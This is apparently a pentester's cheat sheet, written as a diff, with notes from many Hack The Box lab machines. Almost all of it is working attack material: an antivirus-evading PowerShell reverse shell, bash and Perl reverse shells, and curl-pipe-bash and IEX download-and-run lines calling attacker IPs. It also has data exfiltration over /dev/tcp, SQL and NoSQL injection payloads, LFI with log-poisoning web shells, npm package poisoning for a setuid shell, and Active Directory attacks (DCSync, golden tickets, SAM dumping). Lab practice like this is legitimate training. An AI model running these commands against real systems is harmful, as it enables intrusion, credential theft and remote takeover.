+gobuster -u http://10.10.10.119 -w /usr/share/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
+
+[Enumerate LDAP as p389 is open]
+ldapsearch -x -h 10.10.10.119 -s base namingcontexts	(check for anonymous authentication, get dc)
+ldapsearch -x -h 10.10.10.119 -b 'dc=lightweight,dc=htb'	(dump hashes, then unbase64 and crack with mode sha512crypt)
+
+(tcpdump posix capabilities traffic capture)
+/usr/bin/tcpdump cap_net_admin,cap_net_raw+ep
+ssh matt@10.10.10.119 "tcpdump -i ens33 -U -s0 -w - 'not port 22'" > lightweight.cap	(ens33 was the interface) 
+wireshark lightweight.cap
+ssh matt@10.10.10.119 "tcpdump -i lo -U -s0 -w - 'not port 22'"		(and we capture ldap passwords)
+
+[7z password crack]
+apt install libcompress-raw-lzma-perl
+/usr/share/john/7z2john.pl backup.7z > backup7z.hash
+hashcat -m 11600 backup7z.hash /opt/wordlist/Rockyou.txt
+
+getcap *
+openssl =ep		(basically all permissions. by the way there was a difference between what which openssl runs and the openssl binary this gave the capability, which was in home directory)
+(then gtfobins openssl file read or file write)
+ldapuser1 	ALL=(ALL) 	ALL	(add this to /etc/sudoers file and then you can sudo su -)
+__________________________________________________________________________
+
+BOX:DC-9
+
+[sql union injection] 
+(enumerate db names)
+Tom' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata LIMIT 3,1-- -'
+Tom' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -'
+(enumerate tables)
+Tom' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema=users-- -'
+(enumerate columns)
+Tom' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema="Staff" and table_name="users"-- -'
+(table_schema is the db name)
+(fetch users)
+Tom' UNION SELECT group_concat(username,":",password),2,3,4,5,6 FROM Staff.users-- -'
+
+wfuzz -z file,users -z file,passwords -u http://10.10.10.119/login.php -d "username=FUZZ&pass=FUZ2Z"	(how to use multiple files in wfuzz)
+
+(parameter fuzzing)
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.119/manage.php?FUZZ=index.php		(we were suspecting manage.php is expecting a file parameter so we were fuzzing to find that parameter)
+
+GET manage.php?file=../../../../proc/sched_debug		(enumerate running processes through lfi)
+
+__________________________________________________________________________
+
+BOX:SEARCH
+
+cme smb 10.10.11.129		(this is how you can pull domain name for AD boxes)
+(find remoteable users with found creds. must be p0wn3d)
+cme smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success 
+cme winrm 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success 
+psexec.py administrator@10.10.11.158	(if cme shows p0wn3d (meaning admin priv), then you can log in like this. if no admin but the user is part of remote management, you can still login with evil-winrm)
+
+(enumerate smb shares with cme spider plus module)
+cme smb 10.10.11.129 -u matt -p Password123 -M spider_plus		(gives a json output)
+cat /tmp/cme_spider_plus/10.10.11.129.json | jq '. | map_values(keys)'	(list all files in all folders)
+(then get files with smbclient)
+
+[Kerbrute]
+https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
+ntpdate -q 10.10.11.129 		(be careful of clock skew! kerberos related things will fail)
+sudo date -s 01:22
+./kerbrute_linux_amd64 userenum --dc 10.10.11.129 -d search.htb users.txt 
+./kerbrute_linux_amd64 passwordspray --dc 10.10.11.129 -d search.htb users.txt "Nexus123!"  
+
+[Bloodhound Remotely from Kali]
+python3 -m venv .venv
+source .venv/bin/activate
+pip3 install .
+python3 bloodhound.py -u matt.sharp -p Password123 -d search.htb -ns 10.10.11.129 -c All
+
+(Access Protected excel xlsx files)
+unzip phishing.xlsx
+vi /xl/worksheets/sheet2.xml		(and delete sheetProtection entity)
+zip phishing_recovered.xlsx -r .
+
+[ssl certificates]
+(we found .pfx and .p12 CA certificate files in the user directory)
+git clone https://github.com/crackpkcs12/crackpkcs12.git
+cd crackpkcs12/
+./configure
+make
+./crackpkcs12 -d /usr/share/wordlist/rockyou.txt staff.pfx
+(or use jtr:)
+./pfx2john staff.pfx > staff.hash
+john -w /usr/share/wordlist/rockyou.txt staff.hash
+(and then import .pfx to firefox browser)
+
+(ReadGMSAPassword)
+(bloodhound shows when shortest path to DA from owned, we have this permission on a service account user 'bir-adfs-gmsa')
+PS> get-adServiceAccount bir-adfs-gmsa -Properties 'msDS-ManagedPassword'
+$gmsa = Get-ADServiceAccount -Identity 'bir-adfs-gmsa' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+$password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+$cred = New-Object System.Management.Automation.PSCredential "bir-adfs-gmsa",$password
+Invoke-Command -ComputerName 127.0.0.1 -cred $cred -ScriptBlock { whoami }
+
+[Powershell rev shell, that can definitely evade av/windows defender/antivirus]
+$ippsec = New-Object System.Net.Sockets.TCPClient("10.10.14.8",9001);$pleasesub = $ippsec.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $pleasesub.Read($bytes, 0, $bytes.Length)) -ne 0){;$DefNotAV = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dback = (iex $DefnotAV 2>&1 | Out-String );$dback2 = $dback + "  > ";$sdata = ([text.encoding]::ASCII).GetBytes($dback2);$pleasesub.Write($sdata,0,$sdata.Length);$pleasesub.Flush()};$ippsec.Close()
+
+__________________________________________________________________________
+
+BOX:META
+
+(artcorp.htb was only accessible after adding to hostfile, or is different, so webserver uses virtual host)
+gobuster vhost -u artcorp.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+(web page was running exiftool on uploaded images, and exiftool is exploitable)
+git clone https://github.com/OneSecCyber/JPEG_RCE.git
+
+(quoteless bash rev shells)
+vi shell.sh
+    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+curl 10.10.14.3/shell.sh | bash
+wget -O - 10.10.14.3/shell.sh | bash
+(or base64 encode it..)
+
+(sudo -l showed this, which means this XDG_CONFIG_HOME env variable will be kept as user's when you switch to sudo. we add a config file to this variable which is kept when running sudo a binary)
+env_keep+=XDG_CONFIG_HOME
+
+__________________________________________________________________________
+
+BOX:ACUTE
+
+PS> gic C:\utils -Force		(show hidden files)
+
+msf
+use exploit/multi/handler 
+meterpreter> migrate 3588		(in running processes we saw an interactive explorer session, indicating a user physically logged in)
+screenshot				(takes screenshot of user typing passwords in shell)
+
+[Dumping SAM Hive as Local Admin]
+reg save HKLM\sam samhivebackup
+reg save HKLM\system systemhivebackup
+impacket-secretsdump -system systemhivebackup -sam samhivebackup LOCAL
+(or hashdump from meterpreter session, or post/windows/gather/smart_hashdump module)
+
+hashcat acute.hash /opt/wordlist/rockyou.txt -m 1000 --user  (since hash file is in username:hash format, we have to add --user flag)
+
+(how to escape double quotes if you need triple quoting)
+'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.3/rev.ps1\")"'
+
+(he just base64 files to send them back to kali machine)
+PS> [convert]::ToBase64String((Get-Content - path "2022_BloodHound.zip" -Encoding byte))
+__________________________________________________________________________
+
+BOX:TIMELAPSE
+
+smb: \> ls Dev		(no results)
+smb: \> ls Dev\		(lists dir contents!!!)
+
+(we find a pfx file in the smb server)
+openssl pkcs12 -in legacy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacy_dev_auth.pfx -nokeys -out key.cert
+evi-winrm -S -i 10.10.11.152 -c key.pem -k key.pem		(this can log us in with evilwinrm)
+
+(LAPS_Readers Group Member)
+(user was a member of this group and read passwords off of ms-Mcs-AdmPwd attribute running this command:)
+get-adcomputer -Filter 'ObjectClass -eq "computer"' -Property *
+(or use this program)
+https://github.com/n00py/LAPSDumper.git
+python laps.py -u user -p password -d domain.local
+__________________________________________________________________________
+
+BOX:TALKATIVE
+
+talkative.htb/bolt/	(Bolt CMS default page)
+
+[Jamovi R editor code execution]
+system("whoami", intern=TRUE)
+
+(dump sqlite database)
+cat /var/www/talkative.htb/bolt/var/data/bolt.sqlite > /dev/tcp/10.10.14.3/9001 
+nc -lvnp 9001 >bolt.sqlite
+sqlite3 bolt.sqlite
+sqlite> .dump
+sqlite> select * from bolt_user;
+
+[escape out of docker using ssh]
+(ssh was filtered by firewall externally but we found creds)
+hostname -I			(find out that ip of the host system 172.17.0.1, if docker shows 172.17.0.12) 
+ssh matt@172.17.0.1		(ssh is not filtered by firewall from inside the host)
+
+ps -ef --forest | less -S		(navigate ps easily)
+
+(we access to mongodb and change our user's role to admin, or alternatively change admin user's password hash to ours)
+mongosh> db.users.show()
+         db.users.update( { "_id": "2"},{ $set: {"roles": ["admin"]}}) 
+
+
+[Docker Linux Capabilities Exploit]
+(we drop inside a docker container..)
+cat /proc/self/status | grep Cap	(showing cap values)
+capsh --decode=0008abc7820		(we decode on our own system since capsh is not installed on this machine)
+https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
+(and search here for the specific capability)
+__________________________________________________________________________
+
+BOX:STREAMIO
+
+feroxbuster -u http://streamio.htb -x php	(might be a better gobuster alternative as does dir recursion)
+
+[mssql stacked call sql injection]
+q=500'; exec xp_dirtree '\\10.10.14.3\share\file';-- -
+sudo responder -I tap0			(and steal the hash)
+(xp_cmdshell:)
+q=500'; exec sp_reconfigure 'show advanced options', 1; reconfigure; exec sp_reconfigure 'xp_cmdshell', 1; reconfigure; exec xp_cmdshell 'ping 10.10.14.3';-- -
+
+[mssql manual enumeration and dump through union injection]
+q=500' union select 1,db_name(4),3,4,5,6-- -		(enum db names)
+q=500' union select 1,name,id,4,5,6 from users..sysobjects where xtype='u'-- -			(enum table name and id)
+q=500' union select 1,string_agg(CONCAT(name,id),'|'),3,4,5,6 from streamiodb..sysobjects where xtype='u'-- -
+(enum table name and id pretty)
+q=500' union select 1,string_agg(CONCAT(name),'|'),3,4,5,6 from streamiodb..syscolumns where id=901578520-- -
+(enum columns of table id 901578520)
+q=500' union select 1,string_agg(CONCAT(username,password),'|'),3,4,5,6 from streamiodb..users-- -
+(dump columns from this table)
+
+[Firefox Credentials Exposed, Found by LinPeas]
+cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles
+cd 5rwivk2l.default-release
+git clone https://github.com/lclevy/firepwd.git 	(to decrypt firefox saved passwords)
+python3 firepwd.py key4.db logins.json
+
+[Bloodhound Abuse Paths]
+(jdgodd user had writeall access to a high priviledged group 'Core Staff', but only nikk37 user can winrm. so we log in as nikk37 but use jdgodd's credentials for the abuse path shown in bloodhound, and add nikk37 as a member of Core Staff group)
+$pwd = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDGodd', $pwd)
+IEX(IWR http://10.10.14.3/PowerView.ps1 -UseBasicParsing)	(start PowerView as below are PowerView commands)
+Set-DomainObjectOwner -Identity 'Core Staff' -OwnerIdentity nikk37 -Cred $cred    (change corestaff group's owner to nikk37)
+Add-DomainObjectAcl -TargetIdentity 'Core Staff' -PrincipalIdentity jdgodd -Cred $cred
+(give jdgodd the ability to modify acls to this group)
+Set-DomainGroupMember -Identity 'Core Staff' -Members nikk37 -Cred $cred     (add nikk37 to this group)
+Get-DomainObject DC -Properties "ms-mcs-AdmPwd", name	(this core staff group user could read LAPS DA password)
+__________________________________________________________________________
+
+BOX:SEVENTEEN
+
+http://oldmanagement.seventeen.htb (db was showing user avatars in ../oldmanagement/files/, and the webserver erms.seventeen.htb was in the root folder already, so we guessed there was another subdomain as we went up a directory from the root folder)
+
+shell.php7
+shell.phtml
+shell.phar
+shell.inc		(php upload file extension alternatives)
+
+grep -i mysql *
+grep -i db *
+grep -i password *	(extracting information from web server root folders)
+
+(custom npm service abuse, package poisoning)
+(we found a port listening on 4873, which showed that box has its own npm service)
+npm search --registry http://localhost:4873		(list all modules)
+npm install db-logger --registry http://localhost:4873	(will be installed under $cwd/node_modules)
+(and the source code of this module package had clear credentials. anyways we continue with module poisoning)
+(a bash script was installing a module from this local npm registry)
+vi .npmrc	(and change localhost to our ip)
+    registry=http://10.10.14.3:4873/
+sudo docker pull verdaccio/verdaccio		(verdaccio was the registry service)
+sudo docker run -it --rm -p 4873:4873	verdaccio/verdaccio
+npm adduser --registry http://10.10.14.3:4873/
+mkdir loglevel		(this was the module to poison)
+npm init		(make version number bigger than the installed on the target machine)
+vi index.js		(entry point for the module)
+    require("child_process").exec("chown root:root /tmp/shell; chmod 4755 /tmp/shell")
+cp /bin/bash /tmp/shell
+/tmp/shell -p		(-p flag to keep setuid bit on execution)
+
+__________________________________________________________________________
+
+BOX:SUPPORT
+
+cme smb 10.10.11.174 --shares -u '' -p ''		(try null authentication on smb server)
+cme smb 10.10.11.174 --shares -u 'anyone' -p ''		(try anonymous authentication on smb server)
+cme smb 10.10.11.174 --shares -u 'guest' -p ''		(try guest authentication on smb server)
+smbclient -N //10.10.11.174/support-tools		(connect to smb with anonymous auth, which was allowed)
+
+ldapsearch -h support.htb -D 'ldap@support.htb' -w 'Password123' -b 'dc=support,dc=htb'	(enumerate all users info through ldap service with open port. info or description field of an user had a clear text password) 
+
+(GenericAll Exploit)
+(On Bloodhound, we searched for Group Delegated Object Control and followed the Abuse Path steps basically)
+git clone https://github.com/Kevin-Robertson/Powermad
+curl 10.10.14.3/Rubeus.exe -o Rubeus.exe
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Powermad.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerView.ps1')
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
+
+[Psexec kirbi ticket]
+(using a Rubeus extracted kirbi ticket to psexec remote shelling)
+ticketConverter.py ticket.kirbi ticket.ccache
+KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
+
+(run .exe files on kali)
+sudo snap install powershell
+apt search dotnet
+apt install dotnet-sdk-7.0
+apt install mono-complete
+dotnet run ./UserInfo.exe	(file UserInfo.exe shows mono/dotnet application)
+__________________________________________________________________________
+
+BOX:DRIVER
+
+(nmap scan shows webserver with MFP printer login service..)
+
+[SCF FILE ATTACK]
+vi attack.scf
+	[Shell]
+	Command=2
+	IconFile=\\10.10.14.3\share\pentestlab.ico
+	[Taskbar]
+	Command=ToggleDesktop
+sudo python3 Responder.py
+(and upload scf file to firmware share)
+
+./evil-winrm.rb -i 10.10.11.106 -u tony -p liltony -s scripts/ -e exes/	(now if you put scripts and exes in your local folder, you can execute them via evil-winrm without downloading to the target machine)
+upload exes/winPEAS.exe		(or upload after evil-winrm session started)
+
+(run winrm from metaploit with credentials)
+use auxiliary/scanner/winrm/winrm_cmd
+
+[Ricoh Printer Driver Exploit]
+https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/
+(1. Put PoC.exe, Dll.dll, watermark.dll, launch.bat in same folder
+2. Modify printer name in script to match actual installed Ricoh driver
+3. Run launch.bat
+4. Wait and check if C:\result.txt appears
+5. If yes → LPE success, you now have code execution as SYSTEM)
+
+[PrintNightmare]
+impacket-rpcdump @10.10.11.116		(lists rpc endpoints and if you see MS-RPRN it indicates it may be vulnerable to printnightmare)
+https://github.com/calebstewart/CVE-2021-1675
+.\CVE-2021-1675.ps1
+Invoke-Nightmare		(adds user as local administrator)
+__________________________________________________________________________
+
+BOX:BUFF
+
+(rev shell ps1 was blocked after download by AV, so we downloaded nc.exe to the machine and connected back to us)
+cp /usr/share/windows-resources/binaries/nc.exe .
+curl 10.10.14.2/nc.exe -o nc.exe
+PS> nc.exe 10.10.14.2 9001 -e powershell	(nc -lvnp 9001 from kali)
+
+(using chisel to access locally running mysql from our kali machine)
+./chisel server --reverse --port 9002				(from kali) 
+PS> .\chisel.exe client 10.10.14.3:9002 R:3306:localhost:3306
+
+__________________________________________________________________________
+
+BOX:REMOTE
+
+10.10.10.180/umbraco	(umbraco cms default login page)
+strings umbraco.sdf | grep -i password		(in the web dir we found this db file)
+
+[NFS enumeration]
+(nfs was listening on port 2049)
+apt install nfs-common
+showmount -e 10.10.10.180		(shows directories. can be mountable or writeable)
+sudo mkdir /mnt/remote
+sudo mount -t nfs 10.10.10.180/site_backups /mnt/remote
+
+cmd.exe /c ping 10.10.14.3	(poc exploit payload was starting calc.exe, so we changed to cmd.exe)
+
+[Modifiable Services]
+(service UsoSvc shown as AllAccess, Start on winpeas)
+sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand POWERSHELLBASE64ENCODEDREVSHELLHERE"
+sc.exe stop UsoSvc
+sc.exe start UsoSvc
+
+[RougePotato]
+(juicy potato does not work anymore in newer win)
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{C5D3C0E1-DC41-4F83-8BA8-CC0D46BCCDE3}"
+https://github.com/ohpe/juicy-potato/tree/master/CLSID 		(CLSID for specific OS, some of them dont work so try several)
+
+__________________________________________________________________________
+
+BOX:SAUNA
+
+[ASRep roasting from impacket]
+cd /usr/share/doc/python3-impacket/examples
+GetNPUsers.py egotistical-bank.local/administrator -no-pass
+./GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local -format hashcat	(asreproasting, with hashcat formatted output)
+hashcat -m 18200 saunahash.asrep /usr/share/wordlists/rockyou.txt
+
+[Find Principals with DCSync]
+(GetChanges and GetChangesAll privileges both existed in svc_loan user, which we pwned)
+secretsdump.py egotistical-bank.local/svc_loan@10.10.10.175
+__________________________________________________________________________
+
+BOX:SERVMON
+
+(nrpe/nsce)
+type C:\Program~\NSClient\nsclient.ini		(config file for nrpe application)
+
+(base64 encode commands for win)
+echo 'ping -n 1 10.10.14.3' | iconv -t utf-16le | base64 -w 0
+
+__________________________________________________________________________
+
+BOX:NEST
+
+iconv -f UTF-16LE -t UTF-8 config.xml		(windows to unix file format conversion)
+
+cat IT\Carl\NotepadPlusPlus\config.xml			(showed notepad history with important files inside) 
+ls IT		(permission denied)
+ls IT/Carl	(permission exists for this sub dir)
+
+(custom binary program running on port 4386)
+nc 10.10.10.178 4386
+ncat 10.10.10.178 4386
+telnet 10.10.10.178.4386	(this works as three of them handles line breaks differently)
+
+[Hidden Alternate Stream in SMB Share]
+smbclient -U C.smith //10.10.11.174/users
+allinfo "Debug Mode Password.txt"		(this file was empty but with allinfo we see an alternate stream: stream [:Password:$DATA])
+get "Debug Mode Password.txt":Password
+__________________________________________________________________________
+
+BOX:FOREST
+
+[powershell connect to kali's smb server]
+$pass = convertto-securestring 'password' -AsPlainText -Force
+New-Object System.Management.Automation.PSCredential('ippsec',$pass)
+New-PSDrive -Name ippsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.2\share
+
+[Account Operators Group / WriteDacl Permission]
+net user ippsec PleaseSubscribe /add /domain
+net group "Exchange Windows Permissions" /add ippsec	("Account Operators" group has GenericAll over Exchange Windows Permissions" group..)
+./PowerView.ps1
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ippsec -Rights dcsync	(..which has WriteDacl over Htb.Local. then we can..)
+./secretsdump.py htb/ippsec:Password123@10.10.10.161
+
+[Golden Ticket with Impacket Over Linux]
+(we dumped the hash of krbtgt previously)
+Get-ADDomain htb.local				(get domain SID)
+# To generate the TGT with NTLM
+python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+
+__________________________________________________________________________
+
+BOX:SHOCKER
+
+gobuster dir -u 10.10.10.175 -w /usr/share/wordlists/Rockyou.txt -s 302,307,200,204,301,403 -x sh,pl	(include 403 status code to shown unautherized but existed pages)
+gobuster dir -u 10.10.10.175/cgi-bin -w /usr/share/wordlists/Rockyou.txt -s 302,307,200,204,301,403 -x sh,pl	(include these extensions as this is a cgi-bin directory. also this cgi-bin folder bash version if old enough can be vulnerable to shellshock)
+sudo nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=whoami 10.10.10.175
+
+[Shellshock Http Payload]
+GET: /cgi-bin/user.sh HTTP/1.1
+HOST: 10.10.10.175
+Connection: close
+Cookie: () { :;}; echo; /bin/bash -c whoami
+User-Agent: () { :;}; echo; /bin/bash -c whoami
+Referer: () { :;}; echo; /bin/bash -c whoami
+
+sudo perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'	(user can run perl sudo with nopasswd, so we just run a perl reverse shell, or..)
+perl -e 'exec("/bin/bash")'
+
+__________________________________________________________________________
+
+BOX:MIRAI
+
+ssh pi@10.10.10.48	(webserver indicates a rpi device so we use raspberry pi's defaults creds pi:raspberry)
+
+strings /dev/sdb	(recover deleted file)
+(or use binwalk)
+ssh pi@10.10.10.48 "sudo dcfldd if=/dev/sdb | gzip -1 -" | dcfldd of=pi.dd.gz
+gunzip -d pi.dd.gz
+binwalk -Me pi.dd
+(or)
+photorec pi.dd or testdisk pi.dd		(Non-partitioned > Advanced > List ext4 > c > C to copy the file to recover)
+__________________________________________________________________________
+
+BOX:BLOCKY
+
+sudo nmap -sV -Pn -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 10.10.10.37		(ftp scripts of nmap)
+
+nikto -h 10.10.10.37 -p 80		(webserver vuln scanner)
+
+jad Blockycore.class	(decompile java class file)
+
+wpscan --url http://10.10.10.37 --enumerate u,ap,tt,t	(enumerate users, all plugins, themes, timthumbs)
+http://10.10.10.37/index.php?author=1				(username enumeration manually)
+
+php -a
+php > echo password_hash('password', PASSWORD_DEFAULT);	(get a hashed password to change user pass from phpMyAdmin)
+
+scp pwn 10.10.10.48:		(push file from kali to the target machine)
+scp stuart@192.168.142.144:/home/stuart/.gnupg/trustdb.gpg . 	(from target machine to kali)
+__________________________________________________________________________
+
+BOX:BANK
+
+nslookup			(try to resolve host name, as tcp 53 was open)
+  > SERVER 10.10.10.29
+  > 127.0.0.1
+  > 10.10.10.29
+dnsrecon -r 127.0.0.0/24 -n 10.10.10.29
+dnsrecon -r 127.0.1.0/24 -n 10.10.10.29		(reverse dns lookups, again to resolve the host name)
+
+mysql -u root -p
+mysql > \! /bin/sh				(drop to a shell from mysql if mysql is running as root)
+__________________________________________________________________________
+
+BOX:BEEP
+
+[smtp verify username, send email, LFI]
+telnet 10.10.10.7 25
+EHLO ippsec
+VRFY asterix@localhost
+mail from:pwned@haha.io
+rcpt to: asterix@localhost
+data
+Subject: You got owned
+<?php echo system($_REQUEST['ipp']); ?>
+
+.
+exit
+(then go to ../../../../../../var/mail/asterix in this server with LFI vulnerability)
+GET index.php?language=../../../../../../var/mail/asterix&ipp=whoami
+
+(sudo nmap exploit)
+sudo nmap --interactive			(user can run nmap as sudo)	
+!sh
+
+[Elastix SIP/VoIP service enumeration]
+svwar -m INVITE -e100-300 10.10.10.7	(extension enumeration. extension was needed in the elastix exploit. this information was available in 10.10.10.7/panel/ as well.)
+https://www.exploit-db.com/exploits/18650
+
+__________________________________________________________________________
+
+BOX:SOCCER
+
+gobuster -w /usr/share/wordlists/seclists/Discovery/Web-content/raft-small-words.txt
+
+' or 1=1-- - 			[sql boolean injection]
+sqlmap -u 'ws://soccer.htb:9091/' --data '{"id":"*"}' --risk 3 --level 5    [sqlmap for websocket with req body {id: 1234}]
+[you can first do --dbs to see all databases, then do -D soccer_db --dump to dump a specific database after that]
+
+find / -user david 2>/dev/null | grep -v '^/proc\|^/run\^/sys'		[find user files in the filesystem that we can write]
+find / -group david 2>/dev/null | grep -v '^/proc\|^/run\^/sys'		
+__________________________________________________________________________
+
+BOX:TWOMILLION
+
+[Re-run nmap script scan after adding to /etc/hosts file]
+
+feroxbuster -u 2million.htb 
+
+beautifier.io		[js beautifier for obfuscated js scripts]
+
+curl 2million.htb/api/v1 -H 'Cookie: PHPSESSID=80027318234782'	[enumerate api routes (original api req /api/v1/user/generate]
+
+POST /api/v1/vpn/generate 
+Content-Type: application/json
+{
+    "username": "ippsec (bash -c 'bash -i >& /dev/tcp/10.10.14.8/9000 0>&1')"
+}									[bash command injection in post request (subshell)] 
+
+____________________________________________________________________________________
+
+BOX:PRECIOUS
+
+http://10.10.14.8/$(whoami)		[command injection in web page to pdf converter form input (command substition)]
+[other command injection: ; whoami or backticks whoami backticks or | whoami]
+http://10.10.14.8/$(uname$IFS$--a)	(space was a bad character, replaced with $IFS$-)
+http://10.10.14.8/?q=$(curl$IFS-o$IFS/dev/shm/shell.sh$IFS$-http://10.10.14.8/shell.sh) 
+[and serve shell.sh from our http server to upload a shell then:]
+http://10.10.14.8/?q=$(bash$IFS/dev/shm/shell.sh) 
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md
+
+____________________________________________________________________________________________________
+
+BOX:METATWO
+
+wpscan --url metapress.htb --detection-mode aggressive --plugins-detection aggressive
+
+curl 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ee8f2b09ef&category_id=33&total_service=-7502' -x http://127.0.0.1:8080'					[send over to Burp over proxy to get request for sqlmap]
+(this was a bookingpress wp plugin that has a UNION ALL sqli vulnerability after total_service parameter)
+(search nonce from the source code of the page)
+
+cat ../wp-config.php					[DB_PASSWORD is usually here]
+
+gpg2john hashes.gpg				[hashcat does not support gpg]
+john metatwo.gpg --wordlist=/opt/wordlist/rockyou.txt
+
+______________________________________________________________________________________________________
+
+BOX:SHOPPY
+
+http://shoppy.htb/nonexistentpage		[error page leaking CANNOT GET -> node.js backend]
+
+{						[nosql injection in application/json]
+  "username": { "$ne": null },
+  "password": { "$ne": null }
+}
+{						[nosql injection in application/json]
+  "username": "admin",
+  "password": { "$regex": "." }
+}
+{						[nosql injection in application/json]
+  "username": "admin",
+  "password": { "$ne": "wrongpassword" }
+}
+
+username[$ne]=x&password[$ne]=x			[nosql injection in url encoding]
+username=admin'||'1'=='1&password=ippsec
+
+ffuf -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /opt/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt		[-fs 5400 to filter by odd file size for example]
+
+strings password-manager
+strings -e l password-manager			[source code inspection of a binary for passwords]
+
+docker images		(to find alpine for example)
+docker run --rm it -v /:/mnt alpine /bin/sh	[if we are a member of docker group, docker usually runs as root]
+(then ls /mnt)
+
+/opt/ghidra/ghidraRun				[binary source code extractor]
+
+____________________________________________________________________________________________________________
+
+BOX:TRICK
+
+dig @10.10.11.166 -x 10.10.11.166
+dig @10.10.11.166 axfr trick.htb			[dns lookup]
+dnsrecon -r 10.10.11.0/24 -d '' -n 10.10.11.166		[bruteforcing dns lookup]
+
+GET /index.php?page=php://filter/php://filter/convert.base64-encode/resource=index
+GET /index.php?page=php://filter/php://filter/convert.base64-encode/resource=login
+GET /index.php?page=php://filter/php://filter/convert.base64-encode/resource=db-connect
+[LFI leaking php pages in base64 encoded form]
+GET /index.php?page=....//....//....//....//etc/passwd		[code has str.replace("../")]
+GET /index.php?page=....//....//....//....//proc/self/environ 
+	Range: bytes=200-1000
+GET /index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
+GET /index.php?page=....//....//....//....//var/log/nginx/access.log&cmd=id
+	User-Agent: <?php system($_GET['cmd'); ?>			[access log poisoning]
+
+sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --file-read=/etc/passwd
+[skip time based techniques, also read files off the system]
+sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --file-read=/etc/nginx/sites-enabled/default
+[nginx conf file]
+
+[smtp:]
+nc trick.htb 25
+ehlo trick.htb mail from:<ippsec@offsec.com>
+rcpt to:michael 
+data
+subject: please subscribe
+<?php system($_GET['cmd']); ?>
+GET /index.php?page=....//....//....//....//var/spool/mail/michael&cmd=id
+
+mv iptables.conf iptables.conf.bak
+vi iptables.conf
+cp iptables.conf.bak iptables.conf	[get around if there is dir access but no write access on a file]
+_______________________________________________________________________________
+
+BOX:PAPER
+
+wpscan --url http://office.htb -e ap --plugins-detection aggressive [enumerate all plugins]
+(-e u to enumerate users)
+
+_____________________________________________________________________________________________
+
+BOX:PANDORA
+
+sudo nmap -sU -p- 10.10.11.113 		[scan udp ports]
+
+sudo apt install snmp-mibs-downloader
+nano /etc/snmp/snmp.conf (and uncomment mibs line)
+snmpwalk -c public -v2c 10.10.11.113
+snmpbulkwalk -c public -v2c 10.10.11.113 .
+(then,)
+grep hrSWInstalled snmpwalk.out | less -s
+grep hrSWRunParameters snmpwalk.out | less -s		[system info and commands ran]
+
+snmpenum 10.10.11.136 public linux.txt
+
+sqlmap -r pandora.req --batch --dbs		[enumerate databases first]
+sqlmap -r pandora.req --batch --tables -D pandora	[enumerate tables of a specific database]
+sqlmap -r pandora.req --batch -T sessions_php -D pandora --dump		[dump just one specific table now]
+[then we can copy php session_id to the GET request and refresh browser to login as that user]
+
+nc 10.10.14.8 9002 < /usr/bin/pandora_backup		[send a file from target back to our kali machine]
+nc -lvnp 9002 > pandora_backup
+
+echo /bin/bash > tar
+chmod +x tar
+export PATH=/home/matt:$PATH	[path injection of tar, which is ran from a custom binary without the full path]
+
+[kali >] ssh-keygen -f matt
+[matt >] wget 10.10.14.8:8001/matt.pub
+[matt >] mv matt.pub /authorized_keys
